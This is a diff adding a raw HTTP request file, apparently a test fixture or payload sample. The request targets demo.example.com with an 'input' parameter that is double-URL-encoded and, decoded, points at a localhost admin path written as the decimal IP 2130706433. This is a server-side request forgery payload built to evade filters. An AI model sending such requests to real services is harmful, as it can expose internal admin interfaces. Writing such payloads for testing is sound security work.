@@ -1,0 +1,4 @@
+GET /a?input=http%253A%252F%252F2130706433%252Fadmin HTTP/1.1
+Host: demo.example.com
+Connection: close
+
